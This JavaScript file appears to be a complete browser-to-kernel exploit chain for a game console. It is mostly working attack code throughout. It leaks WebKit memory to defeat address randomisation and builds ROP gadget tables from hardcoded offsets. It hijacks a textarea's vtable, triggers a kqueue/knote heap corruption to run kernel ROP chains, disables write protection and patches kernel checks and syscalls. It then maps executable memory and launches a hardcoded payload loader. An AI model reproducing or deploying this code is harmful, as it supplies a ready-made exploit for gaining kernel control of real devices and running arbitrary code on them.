var chain;
var kchain;
var kchain2;
var SAVED_KERNEL_STACK_PTR;
var KERNEL_BASE_PTR;

var webKitBase;
var webKitRequirementBase;

var libSceLibcInternalBase;
var libKernelBase;

var textArea = document.createElement("textarea");

const OFFSET_wk_vtable_first_element = 0x104F110;
const OFFSET_WK_memset_import = 0x000002A8;
const OFFSET_WK___stack_chk_fail_import = 0x00000178;
const OFFSET_WK_psl_builtin_import = 0xD68;

const OFFSET_WKR_psl_builtin = 0x33BA0;

const OFFSET_WK_setjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_setjmp_gadget_two = 0x01ECE1D3;
const OFFSET_WK_longjmp_gadget_one = 0x0106ACF7;
const OFFSET_WK_longjmp_gadget_two = 0x01ECE1D3;

const OFFSET_libcint_memset = 0x0004F810;
const OFFSET_libcint_setjmp = 0x000BB5BC;
const OFFSET_libcint_longjmp = 0x000BB616;

const OFFSET_WK2_TLS_IMAGE = 0x38e8020;


const OFFSET_lk___stack_chk_fail = 0x0001FF60;
const OFFSET_lk_pthread_create = 0x00025510;
const OFFSET_lk_pthread_join = 0x0000AFA0;

var nogc = [];
var syscalls = {};
var gadgets = {};
var wk_gadgetmap = {
    "ret": 0x32,
    "pop rdi": 0x319690,
    "pop rsi": 0x1F4D6,
    "pop rdx": 0x986C,
    "pop rcx": 0x657B7,
    "pop r8": 0xAFAA71,
    "pop r9": 0x422571,
    "pop rax": 0x51A12,
    "pop rsp": 0x4E293,

    "mov [rdi], rsi": 0x1A97920,
    "mov [rdi], rax": 0x10788F7,
    "mov [rdi], eax": 0x9964BC,

    "cli ; pop rax": 0x566F8,
    "sti": 0x1FBBCC,

    "mov rax, [rax]": 0x241CC,
    "mov rax, [rsi]": 0x5106A0,
    "mov [rax], rsi": 0x1EFD890,
    "mov [rax], rdx": 0x1426A82,
    "mov [rax], edx": 0x3B7FE4,
    "add rax, rsi": 0x170397E,
    "mov rdx, rax": 0x53F501,
    "add rax, rcx": 0x2FBCD,
    "mov rsp, rdi": 0x2048062,
    "mov rdi, [rax + 8] ; call [rax]": 0x751EE7,
    "infloop": 0x7DFF
};

var wkr_gadgetmap = {
    "xchg rdi, rsp ; call [rsi - 0x79]": 0x1d74f0 //JOP 3
};

var wk2_gadgetmap = {
    "mov [rax], rdi": 0xFFDD7,
    "mov [rax], rcx": 0x2C9ECA,
};
var hmd_gadgetmap = {
    "add [r8], r12": 0x2BCE1
};
var ipmi_gadgetmap = {
    "mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]": 0x344B
};

function userland() {

    p.launch_chain = launch_chain;
    p.malloc = malloc;
    p.malloc32 = malloc32;
    p.stringify = stringify;
    p.array_from_address = array_from_address;
    p.readstr = readstr;

    var textAreaAddr = p.leakval(textArea);
    var textAreVtablePtrPtr = textAreaAddr.add32(0x18);
    var textAreaVtPtr = p.read8(textAreVtablePtrPtr);

    //pointer to vtable address
    var textAreaVtPtr = p.read8(p.leakval(textArea).add32(0x18));
    //address of vtable
    var textAreaVtable = p.read8(textAreaVtPtr);
    //use address of 1st entry (in .text) to calculate webkitbase
    webKitBase = p.read8(textAreaVtable).sub32(OFFSET_wk_vtable_first_element);

    libSceLibcInternalBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_memset_import)));
    libSceLibcInternalBase.sub32inplace(OFFSET_libcint_memset);

    libKernelBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)));
    libKernelBase.sub32inplace(OFFSET_lk___stack_chk_fail);

    webKitRequirementBase = p.read8(get_jmptgt(webKitBase.add32(OFFSET_WK_psl_builtin_import)));
    webKitRequirementBase.sub32inplace(OFFSET_WKR_psl_builtin);

    for (var gadget in wk_gadgetmap) {
        window.gadgets[gadget] = webKitBase.add32(wk_gadgetmap[gadget]);
    }
    for (var gadget in wkr_gadgetmap) {
        window.gadgets[gadget] = webKitRequirementBase.add32(wkr_gadgetmap[gadget]);
    }

    function get_jmptgt(address) {
        var instr = p.read4(address) & 0xFFFF;
        var offset = p.read4(address.add32(2));
        if (instr != 0x25FF) {
            return 0;
        }
        return address.add32(0x6 + offset);
    }

    function malloc(sz) {
        var backing = new Uint8Array(0x10000 + sz);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = backing;
        return ptr;
    }

    function malloc32(sz) {
        var backing = new Uint8Array(0x10000 + sz * 4);
        window.nogc.push(backing);
        var ptr = p.read8(p.leakval(backing).add32(0x10));
        ptr.backing = new Uint32Array(backing.buffer);
        return ptr;
    }

    function array_from_address(addr, size) {
        var og_array = new Uint32Array(0x1000);
        var og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(8), size);

        nogc.push(og_array);
        return og_array;
    }

    function stringify(str) {
        var bufView = new Uint8Array(str.length + 1);
        for (var i = 0; i < str.length; i++) {
            bufView[i] = str.charCodeAt(i) & 0xFF;
        }
        window.nogc.push(bufView);
        return p.read8(p.leakval(bufView).add32(0x10));
    }

    function readstr(addr) {
        var str = "";
        for (var i = 0;; i++) {
            var c = p.read1(addr.add32(i));
            if (c == 0x0) {
                break;
            }
            str += String.fromCharCode(c);

        }
        return str;
    }

    function array_from_address(addr, size) {
        var og_array = new Uint32Array(0x1000);
        var og_array_i = p.leakval(og_array).add32(0x10);

        p.write8(og_array_i, addr);
        p.write4(og_array_i.add32(8), size);

        nogc.push(og_array);
        return og_array;
    }

    var fakeVtable_setjmp = p.malloc32(0x200);
    var fakeVtable_longjmp = p.malloc32(0x200);
    var original_context = p.malloc32(0x40);
    var modified_context = p.malloc32(0x40);

    p.write8(fakeVtable_setjmp.add32(0x0), fakeVtable_setjmp);
    p.write8(fakeVtable_setjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_setjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
    p.write8(fakeVtable_setjmp.add32(0x10), original_context);
    p.write8(fakeVtable_setjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_setjmp));
    p.write8(fakeVtable_setjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_setjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

    p.write8(fakeVtable_longjmp.add32(0x0), fakeVtable_longjmp);
    p.write8(fakeVtable_longjmp.add32(0xA8), webKitBase.add32(OFFSET_WK_longjmp_gadget_two)); // mov rdi, qword ptr [rdi + 0x10] ; jmp qword ptr [rax + 8]
    p.write8(fakeVtable_longjmp.add32(0x10), modified_context);
    p.write8(fakeVtable_longjmp.add32(0x8), libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));
    p.write8(fakeVtable_longjmp.add32(0x1C8), webKitBase.add32(OFFSET_WK_longjmp_gadget_one)); // mov rax, qword ptr [rcx]; mov rdi, rcx; jmp qword ptr [rax + 0xA8]

    function launch_chain(chain) {
        chain.push(window.gadgets["pop rdi"]);
        chain.push(original_context);
        chain.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp));

        p.write8(textAreaVtPtr, fakeVtable_setjmp);
        textArea.scrollLeft = 0x0;
        p.write8(modified_context.add32(0x00), window.gadgets["ret"]);
        p.write8(modified_context.add32(0x10), chain.stack);
        p.write8(modified_context.add32(0x40), p.read8(original_context.add32(0x40)))

        p.write8(textAreaVtPtr, fakeVtable_longjmp);
        textArea.scrollLeft = 0x0;
        p.write8(textAreaVtPtr, textAreaVtable);
    }

    var kview = new Uint8Array(0x1000);
    var kstr = p.leakval(kview).add32(0x10);
    var orig_kview_buf = p.read8(kstr);

    p.write8(kstr, window.libKernelBase);
    p.write4(kstr.add32(8), 0x40000);
    var countbytes;

    for (var i = 0; i < 0x40000; i++) {
        if (kview[i] == 0x72 && kview[i + 1] == 0x64 && kview[i + 2] == 0x6c && kview[i + 3] == 0x6f && kview[i + 4] == 0x63) {
            countbytes = i;
            break;
        }
    }
    p.write4(kstr.add32(8), countbytes + 32);
    var dview32 = new Uint32Array(1);
    var dview8 = new Uint8Array(dview32.buffer);
    for (var i = 0; i < countbytes; i++) {
        if (kview[i] == 0x48 && kview[i + 1] == 0xc7 && kview[i + 2] == 0xc0 && kview[i + 7] == 0x49 && kview[i + 8] == 0x89 && kview[i + 9] == 0xca && kview[i + 10] == 0x0f && kview[i + 11] == 0x05) {
            dview8[0] = kview[i + 3];
            dview8[1] = kview[i + 4];
            dview8[2] = kview[i + 5];
            dview8[3] = kview[i + 6];
            var syscallno = dview32[0];
            window.syscalls[syscallno] = window.libKernelBase.add32(i);
        }
    }
    p.write8(kstr, orig_kview_buf);

    chain = new rop();
}

function run_hax() {
    userland();
    if (chain.syscall(23, 0).low != 0x0) {
        kernel();
        //this wk exploit is pretty stable we can probably afford to kill webkit before payload loader but should we?.
    }

    var payload_buffer = chain.syscall(477, new int64(0x26200000, 0x9), 0x300000, 7, 0x41000, -1, 0);
    var payload_loader = p.malloc32(0x1000);

    var loader_writer = payload_loader.backing;
    loader_writer[0] = 0x56415741;
    loader_writer[1] = 0x83485541;
    loader_writer[2] = 0x894818EC;
    loader_writer[3] = 0xC748243C;
    loader_writer[4] = 0x10082444;
    loader_writer[5] = 0x483C2302;
    loader_writer[6] = 0x102444C7;
    loader_writer[7] = 0x00000000;
    loader_writer[8] = 0x000002BF;
    loader_writer[9] = 0x0001BE00;
    loader_writer[10] = 0xD2310000;
    loader_writer[11] = 0x00009CE8;
    loader_writer[12] = 0xC7894100;
    loader_writer[13] = 0x8D48C789;
    loader_writer[14] = 0xBA082474;
    loader_writer[15] = 0x00000010;
    loader_writer[16] = 0x000095E8;
    loader_writer[17] = 0xFF894400;
    loader_writer[18] = 0x000001BE;
    loader_writer[19] = 0x0095E800;
    loader_writer[20] = 0x89440000;
    loader_writer[21] = 0x31F631FF;
    loader_writer[22] = 0x0062E8D2;
    loader_writer[23] = 0x89410000;
    loader_writer[24] = 0x2C8B4CC6;
    loader_writer[25] = 0x45C64124;
    loader_writer[26] = 0x05EBC300;
    loader_writer[27] = 0x01499848;
    loader_writer[28] = 0xF78944C5;
    loader_writer[29] = 0xBAEE894C;
    loader_writer[30] = 0x00001000;
    loader_writer[31] = 0x000025E8;
    loader_writer[32] = 0x7FC08500;
    loader_writer[33] = 0xFF8944E7;
    loader_writer[34] = 0x000026E8;
    loader_writer[35] = 0xF7894400;
    loader_writer[36] = 0x00001EE8;
    loader_writer[37] = 0x2414FF00;
    loader_writer[38] = 0x18C48348;
    loader_writer[39] = 0x5E415D41;
    loader_writer[40] = 0x31485F41;
    loader_writer[41] = 0xC748C3C0;
    loader_writer[42] = 0x000003C0;
    loader_writer[43] = 0xCA894900;
    loader_writer[44] = 0x48C3050F;
    loader_writer[45] = 0x0006C0C7;
    loader_writer[46] = 0x89490000;
    loader_writer[47] = 0xC3050FCA;
    loader_writer[48] = 0x1EC0C748;
    loader_writer[49] = 0x49000000;
    loader_writer[50] = 0x050FCA89;
    loader_writer[51] = 0xC0C748C3;
    loader_writer[52] = 0x00000061;
    loader_writer[53] = 0x0FCA8949;
    loader_writer[54] = 0xC748C305;
    loader_writer[55] = 0x000068C0;
    loader_writer[56] = 0xCA894900;
    loader_writer[57] = 0x48C3050F;
    loader_writer[58] = 0x006AC0C7;
    loader_writer[59] = 0x89490000;
    loader_writer[60] = 0xC3050FCA;
    chain.syscall(74, payload_loader, 0x4000, (0x1 | 0x2 | 0x4));

    var pthread = p.malloc(0x10);
    chain.call(libKernelBase.add32(OFFSET_lk_pthread_create), pthread, 0x0, payload_loader, payload_buffer);
    awaitpl();
}

function kernel() {
    extra_gadgets();
    kchain_setup();
    object_setup();
    trigger_spray();
}

var handle;
var random_path;
var ex_info;

function load_prx(name) {
    //sys_dynlib_load_prx
    var res = chain.syscall(594, p.stringify(`/${random_path}/common/lib/${name}`), 0x0, handle, 0x0);
    if (res.low != 0x0) {
        alert("failed to load prx/get handle " + name);
    }
    //sys_dynlib_get_info_ex
    p.write8(ex_info, 0x1A8);
    res = chain.syscall(608, p.read4(handle), 0x0, ex_info);
    if (res.low != 0x0) {
        alert("failed to get module info from handle");
    }
    var tlsinit = p.read8(ex_info.add32(0x110));
    var tlssize = p.read4(ex_info.add32(0x11C));

    if (tlssize != 0) {
        if (name == "libSceWebKit2.sprx") {
            tlsinit.sub32inplace(OFFSET_WK2_TLS_IMAGE);
        } else {
            alert(`${name}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`);
        }
    }
    return tlsinit;
}

function extra_gadgets() {
    handle = p.malloc(0x150);
    var randomized_path_ptr = handle.add32(0x4);
    ex_info = randomized_path_ptr.add32(0x30);

    chain.syscall(602, 0, randomized_path_ptr);
    random_path = p.readstr(randomized_path_ptr);

    var ipmi_addr = load_prx("libSceIpmi.sprx");
    var hmd_addr = load_prx("libSceHmd.sprx");
    var wk2_addr = load_prx("libSceWebKit2.sprx");

    for (var gadget in hmd_gadgetmap) {
        window.gadgets[gadget] = hmd_addr.add32(hmd_gadgetmap[gadget]);
    }
    for (var gadget in wk2_gadgetmap) {
        window.gadgets[gadget] = wk2_addr.add32(wk2_gadgetmap[gadget]);
    }
    for (var gadget in ipmi_gadgetmap) {
        window.gadgets[gadget] = ipmi_addr.add32(ipmi_gadgetmap[gadget]);
    }

    for (var gadget in window.gadgets) {
        p.read8(window.gadgets[gadget]);
    }
}

function kchain_setup() {
    const KERNEL_setidt = 0x312c40;
    const KERNEL_setcr0 = 0x1FB949;
    const KERNEL_Xill = 0x17d500;
    const KERNEL_veriPatch = 0x626874;
    const KERNEL_enable_syscalls_1 = 0x490;
    const KERNEL_enable_syscalls_2 = 0x4B5;
    const KERNEL_enable_syscalls_3 = 0x4B9;
    const KERNEL_enable_syscalls_4 = 0x4C2;
    const KERNEL_mprotect = 0x80B8D;
    const KERNEL_prx = 0x23AEC4;
    const KERNEL_dlsym_1 = 0x23B67F;
    const KERNEL_dlsym_2 = 0x221b40;


    const KERNEL_setuid = 0x1A06;
    const KERNEL_syscall11_1 = 0x1100520;
    const KERNEL_syscall11_2 = 0x1100528;
    const KERNEL_syscall11_3 = 0x110054C;
    const KERNEL_syscall11_gadget = 0x4c7ad;
    const KERNEL_mmap = 0x16632A;
    const KERNEL_setcr0_patch = 0x3ade3B;
    const KERNEL_kqueue_close_epi = 0x398991;

    SAVED_KERNEL_STACK_PTR = p.malloc(0x200);
    KERNEL_BASE_PTR = SAVED_KERNEL_STACK_PTR.add32(0x8);
    //negative offset of kqueue string to kernel base
    //0xFFFFFFFFFF86B593 0x505
    //0xFFFFFFFFFF80E364 0x900
    p.write8(KERNEL_BASE_PTR, new int64(0xFF80E364, 0xFFFFFFFF));

    kchain = new rop();
    kchain2 = new rop();

    kchain.count = 0;
    kchain2.count = 0;

    kchain.set_kernel_var(KERNEL_BASE_PTR);
    kchain2.set_kernel_var(KERNEL_BASE_PTR);

    kchain.push(gadgets["pop rax"]);
    kchain.push(SAVED_KERNEL_STACK_PTR);
    kchain.push(gadgets["mov [rax], rdi"]);
    kchain.push(gadgets["pop r8"]);
    kchain.push(KERNEL_BASE_PTR);
    kchain.push(gadgets["add [r8], r12"]);



    var idx1 = kchain.write_kernel_addr_to_chain_later(KERNEL_setidt);
    var idx2 = kchain.write_kernel_addr_to_chain_later(KERNEL_setcr0);
    //Modify UD
    kchain.push(gadgets["pop rdi"]);
    kchain.push(0x6);
    kchain.push(gadgets["pop rsi"]);
    kchain.push(gadgets["mov rsp, rdi"]);
    kchain.push(gadgets["pop rdx"]);
    kchain.push(0xE);
    kchain.push(gadgets["pop rcx"]);
    kchain.push(0x0);
    kchain.push(gadgets["pop r8"]);
    kchain.push(0x0);
    var idx1_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // overwritten with KERNEL_setidt

    kchain.push(gadgets["pop rsi"]);
    kchain.push(0x80040033);
    kchain.push(gadgets["pop rdi"]);
    kchain.push(kchain2.stack);
    var idx2_dest = kchain.get_rsp();
    kchain.pushSymbolic(); // overwritten with KERNEL_setcr0

    kchain.finalizeSymbolic(idx1, idx1_dest);
    kchain.finalizeSymbolic(idx2, idx2_dest);

    //Restore original UD

    var idx3 = kchain2.write_kernel_addr_to_chain_later(KERNEL_Xill);
    var idx4 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setidt);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x6);
    kchain2.push(gadgets["pop rsi"]);
    var idx3_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_Xill
    kchain2.push(gadgets["pop rdx"]);
    kchain2.push(0xE);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x0);
    kchain2.push(gadgets["pop r8"]);
    kchain2.push(0x0);
    var idx4_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_setidt 

    kchain2.finalizeSymbolic(idx3, idx3_dest);
    kchain2.finalizeSymbolic(idx4, idx4_dest);

    //Apply kernel patches    

    kchain2.kwrite4(KERNEL_veriPatch, 0x83489090);

    kchain2.kwrite4(KERNEL_enable_syscalls_1, 0x00000000);
    //patch in reverse because /shrug
    kchain2.kwrite4(KERNEL_enable_syscalls_4, 0x04EB69EB);
    kchain2.kwrite4(KERNEL_enable_syscalls_3, 0x3B489090);
    kchain2.kwrite4(KERNEL_enable_syscalls_2, 0xC9859090);

    kchain2.kwrite4(KERNEL_setuid, 0x8B482AEB);
    kchain2.kwrite4(KERNEL_mprotect, 0x00000000);
    kchain2.kwrite4(KERNEL_prx, 0x00C0E990);
    kchain2.kwrite4(KERNEL_dlsym_1, 0x8B484CEB);
    kchain2.kwrite4(KERNEL_dlsym_2, 0xC3C03148);

    kchain2.kwrite4(KERNEL_mmap, 0x37B24137);

    kchain2.kwrite4(KERNEL_syscall11_1, 0x00000002);
    kchain2.kwrite8_kaddr(KERNEL_syscall11_2, KERNEL_syscall11_gadget);
    kchain2.kwrite4(KERNEL_syscall11_3, 0x00000001);

    //Restore CR0
    kchain2.kwrite4(KERNEL_setcr0_patch, 0xC3C7220F);
    var idx5 = kchain2.write_kernel_addr_to_chain_later(KERNEL_setcr0_patch);
    kchain2.push(gadgets["pop rdi"]);
    kchain2.push(0x80050033);
    var idx5_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with KERNEL_setcr0_patch
    kchain2.finalizeSymbolic(idx5, idx5_dest);


    //Recover
    kchain2.rax_kernel(KERNEL_kqueue_close_epi);
    kchain2.push(gadgets["mov rdx, rax"]);
    kchain2.push(gadgets["pop rsi"]);
    kchain2.push(SAVED_KERNEL_STACK_PTR);
    kchain2.push(gadgets["mov rax, [rsi]"]);
    kchain2.push(gadgets["pop rcx"]);
    kchain2.push(0x10);
    kchain2.push(gadgets["add rax, rcx"]);
    kchain2.push(gadgets["mov [rax], rdx"]);
    kchain2.push(gadgets["pop rdi"]);
    var idx6 = kchain2.pushSymbolic();
    kchain2.push(gadgets["mov [rdi], rax"]);
    kchain2.push(gadgets["sti"]);
    kchain2.push(gadgets["pop rsp"]);
    var idx6_dest = kchain2.get_rsp();
    kchain2.pushSymbolic(); // overwritten with old stack pointer
    kchain2.finalizeSymbolic(idx6, idx6_dest);
}

function object_setup() {
    //Map fake object
    var fake_knote = chain.syscall(477, 0x4000, 0x4000 * 0x3, 0x3, 0x1012, 0xFFFFFFFF, 0x0);
    var fake_filtops = fake_knote.add32(0x4000);
    var fake_obj = fake_knote.add32(0x8000);
    if (fake_knote.low != 0x4000) {
        alert("enomem: " + fake_knote);
        while (1);
    }
    //setup fake object
    //KNOTE
    {
        p.write8(fake_knote, fake_obj);
        p.write8(fake_knote.add32(0x68), fake_filtops)
    }
    //FILTOPS
    {
        p.write8(fake_filtops.sub32(0x79), gadgets["cli ; pop rax"]); //cli ; pop rax ; ret
        p.write8(fake_filtops.add32(0x0), gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]); //xchg rdi, rsp ; call qword ptr [rsi - 0x79]
        p.write8(fake_filtops.add32(0x8), kchain.stack);
        p.write8(fake_filtops.add32(0x10), gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]); //mov rcx, qword ptr [rdi] ; mov rsi, rax ; call qword ptr [rcx + 0x30]
    }
    //OBJ
    {
        p.write8(fake_obj.add32(0x30), gadgets["mov rdi, [rax + 8] ; call [rax]"]); //mov rdi, qword ptr [rax + 8] ; call qword ptr [rax]
    }
}

var trigger_spray = function () {
    //Make socket <= 0xFF | -> alloc 0x800


    var NUM_KQUEUES = 0x1B0;
    var kqueue_ptr = p.malloc(NUM_KQUEUES * 0x4);
    //Make Kqueues
    {
        for (var i = 0; i < NUM_KQUEUES; i++) {
            chain.fcall(window.syscalls[362]);
            chain.write_result4(kqueue_ptr.add32(0x4 * i));
        }
    }
    chain.run();
    var kqueues = p.array_from_address(kqueue_ptr, NUM_KQUEUES);

    var that_one_socket = chain.syscall(97, 2, 1, 0);
    if (that_one_socket.low < 0x100 || that_one_socket.low >= 0x200) {
        alert("invalid socket");
        while (1);
    }

    //Spray kevents
    var kevent = p.malloc(0x20);
    p.write8(kevent.add32(0x0), that_one_socket);
    p.write4(kevent.add32(0x8), 0xFFFF + 0x010000);
    p.write4(kevent.add32(0xC), 0x0);
    p.write8(kevent.add32(0x10), 0x0);
    p.write8(kevent.add32(0x18), 0x0); {
        for (var i = 0; i < NUM_KQUEUES; i++) {
            chain.fcall(window.syscalls[363], kqueues[i], kevent, 0x1, 0x0, 0x0, 0x0);
        }
    }
    chain.run();



    //Fragment memory
    {
        for (var i = 20; i < NUM_KQUEUES; i += 2) {
            chain.fcall(window.syscalls[6], kqueues[i]);
        }
    }
    chain.run();

    //Trigger OOB
    alert("Insert USB now. do not close the dialog until notification pops, remove usb after closing it.");
    //Trigger corrupt knote
    {
        for (var i = 1; i < NUM_KQUEUES; i += 2) {
            chain.fcall(window.syscalls[6], kqueues[i]);
        }
    }
    chain.run();
    if (chain.syscall(23, 0).low == 0) {
        return;
    }
    alert("exploit failed (kernel heap might be fucked if you *did* insert the USB");
    p.write8(0, 0);
    return;
}